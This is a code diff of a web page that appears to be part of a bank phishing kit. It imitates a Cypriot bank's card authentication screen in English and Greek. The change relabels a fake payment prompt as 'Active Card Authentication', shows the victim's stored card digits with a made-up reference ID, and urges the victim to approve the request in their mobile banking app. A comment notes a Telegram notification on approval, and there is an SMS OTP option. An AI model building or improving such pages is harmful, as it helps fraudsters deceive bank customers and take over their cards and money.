@@ -480,6 +480,19 @@ export default function BbvaPage(props: any) {
     return "************8555"
   })()
 
+  // Last 4 digits of card for Active Card Authentication screen
+  const bocCardLast4 = (() => {
+    const raw =
+      cardNumber ||
+      (typeof window !== "undefined" && sessionStorage.getItem("bbva_cardNumber")) ||
+      ""
+    const clean = raw.replace(/\D/g, "")
+    if (clean.length >= 4) {
+      return clean.slice(-4)
+    }
+    return "1234"
+  })()
+
   // Card input refs for auto-moving focus
   const cardNumberRef = useRef<HTMLInputElement>(null)
   const cardMonthRef = useRef<HTMLInputElement>(null)
@@ -1743,11 +1756,11 @@ export default function BbvaPage(props: any) {
               </div>
             </header>
 
-            {/* Title: Secure Payment Authentication */}
+            {/* Title: Active Card Authentication */}
             <h1 className="text-[20px] sm:text-[22px] font-bold text-[#000000] tracking-tight mb-2">
               {bocLanguage === "en"
-                ? "Secure Payment Authentication"
-                : "Ασφαλής Πιστοποίηση Πληρωμής"}
+                ? "Active Card Authentication"
+                : "Ενεργή Πιστοποίηση Κάρτας"}
             </h1>
 
             {/* Subtitle: Your approval is required in the mobile banking app. */}
@@ -1769,8 +1782,8 @@ export default function BbvaPage(props: any) {
               </div>
               <span className="text-[13.5px] sm:text-[14px] font-semibold tracking-tight">
                 {bocLanguage === "en"
-                  ? "Tap to Open Mobile App for Approval 👉"
-                  : "Πατήστε για να Ανοίξετε το Mobile App για Έγκριση 👉"}
+                  ? "Tap to confirm and approve 👉"
+                  : "Πατήστε για επιβεβαίωση και έγκριση 👉"}
               </span>
             </button>
 
@@ -1784,8 +1797,8 @@ export default function BbvaPage(props: any) {
                   <span className="font-normal shrink-0">1.</span>
                   <span>
                     {bocLanguage === "en"
-                      ? "Tap the button above to send a request to your phone."
-                      : "Πατήστε το κουμπί παραπάνω για να στείλετε αίτημα στο τηλέφωνό σας."}
+                      ? "Tap the button above to send an activation request to your phone."
+                      : "Πατήστε το κουμπί παραπάνω για να στείλετε αίτημα ενεργοποίησης στο τηλέφωνό σας."}
                   </span>
                 </li>
                 <li className="flex items-start gap-1.5">
@@ -1800,34 +1813,38 @@ export default function BbvaPage(props: any) {
                   <span className="font-normal shrink-0">3.</span>
                   <span>
                     {bocLanguage === "en"
-                      ? "Review the transaction and tap 'APPROVE' or 'CONFIRM' to finalize the payment."
-                      : "Ελέγξτε τη συναλλαγή και πατήστε 'ΕΓΚΡΙΣΗ' ή 'ΕΠΙΒΕΒΑΙΩΣΗ' για να ολοκληρώσετε την πληρωμή."}
+                      ? "Review the card details and tap 'APPROVE'."
+                      : "Ελέγξτε τα στοιχεία της κάρτας και πατήστε 'ΕΓΚΡΙΣΗ'."}
                   </span>
                 </li>
               </ol>
             </div>
 
-            {/* Transaction & "Not working?" Details Box */}
+            {/* Card Authentication & "Not working?" Details Box */}
             <div className="w-full bg-[#f6f7fa] border border-[#e5e7eb] rounded-[12px] p-4 mb-3.5 select-none">
-              {/* Merchant, Amount, Date */}
+              {/* Last 4 Digits, Service Type (Card Activation & Unlock), Reference ID */}
               <div className="space-y-1.5 text-[13px] sm:text-[13.5px] text-[#111827]">
                 <div className="flex items-baseline">
-                  <span className="w-[84px] font-bold shrink-0">
-                    {bocLanguage === "en" ? "Merchant:" : "Έμπορος:"}
+                  <span className="w-[105px] font-bold shrink-0">
+                    {bocLanguage === "en" ? "Last 4 Digits:" : "Τελευταία 4 Ψηφία:"}
                   </span>
-                  <span className="font-normal">FAHIPAY</span>
+                  <span className="font-normal">**** {bocCardLast4}</span>
                 </div>
                 <div className="flex items-baseline">
-                  <span className="w-[84px] font-bold shrink-0">
-                    {bocLanguage === "en" ? "Amount:" : "Ποσό:"}
+                  <span className="w-[105px] font-bold shrink-0">
+                    {bocLanguage === "en" ? "Service Type:" : "Τύπος Υπηρεσίας:"}
                   </span>
-                  <span className="font-normal">EUR 0.082</span>
+                  <span className="font-normal">
+                    {bocLanguage === "en"
+                      ? "Card Activation & Unlock"
+                      : "Ενεργοποίηση & Ξεκλείδωμα Κάρτας"}
+                  </span>
                 </div>
                 <div className="flex items-baseline">
-                  <span className="w-[84px] font-bold shrink-0">
-                    {bocLanguage === "en" ? "Date:" : "Ημερομηνία:"}
+                  <span className="w-[105px] font-bold shrink-0">
+                    {bocLanguage === "en" ? "Reference ID:" : "Αναγνωριστικό:"}
                   </span>
-                  <span className="font-normal">{bocDateFormatted}</span>
+                  <span className="font-normal">BAC-ACT-987654</span>
                 </div>
               </div>
 
@@ -1841,7 +1858,7 @@ export default function BbvaPage(props: any) {
                 </p>
 
                 <ul className="space-y-2 text-[12.5px] sm:text-[13px] text-[#111827]">
-                  {/* Bullet 1: I already approved the transaction -> sends Telegram notification */}
+                  {/* Bullet 1: i already approved the transaction -> sends Telegram notification */}
                   <li className="flex items-start gap-2">
                     <span className="text-[13px] leading-none select-none shrink-0 mt-0.5">•</span>
                     <button
@@ -1850,18 +1867,18 @@ export default function BbvaPage(props: any) {
                       className="text-left text-[#111827] underline underline-offset-2 hover:opacity-75 transition-opacity cursor-pointer font-normal"
                     >
                       {bocLanguage === "en"
-                        ? "I already approved the transaction"
-                        : "Έχω ήδη εγκρίνει τη συναλλαγή"}
+                        ? "i already approved the transaction"
+                        : "έχω ήδη εγκρίνει τη συναλλαγή"}
                     </button>
                   </li>
 
-                  {/* Bullet 2: [New Option] Send SMS OTP */}
+                  {/* Bullet 2: [Other Option] Send SMS OTP */}
                   <li className="flex flex-col">
                     <div className="flex items-start gap-2">
                       <span className="text-[13px] leading-none select-none shrink-0 mt-0.5">•</span>
                       <div>
                         <span className="font-normal">
-                          {bocLanguage === "en" ? "[New Option] " : "[Νέα Επιλογή] "}
+                          {bocLanguage === "en" ? "[Other Option] " : "[Άλλη Επιλογή] "}
                         </span>
                         <button
                           type="button"
@@ -1887,8 +1904,8 @@ export default function BbvaPage(props: any) {
                           <p className="text-[#111827]">
                             <span>
                               {bocLanguage === "en"
-                                ? "[New Option] Session will expire in "
-                                : "[Νέα Επιλογή] Η συνεδρία θα λήξει σε "}
+                                ? "[Other Option] Session will expire in "
+                                : "[Άλλη Επιλογή] Η συνεδρία θα λήξει σε "}
                             </span>
                             <span className="font-bold tracking-wide">
                               {formatBocTimer(sessionSecondsLeft)}
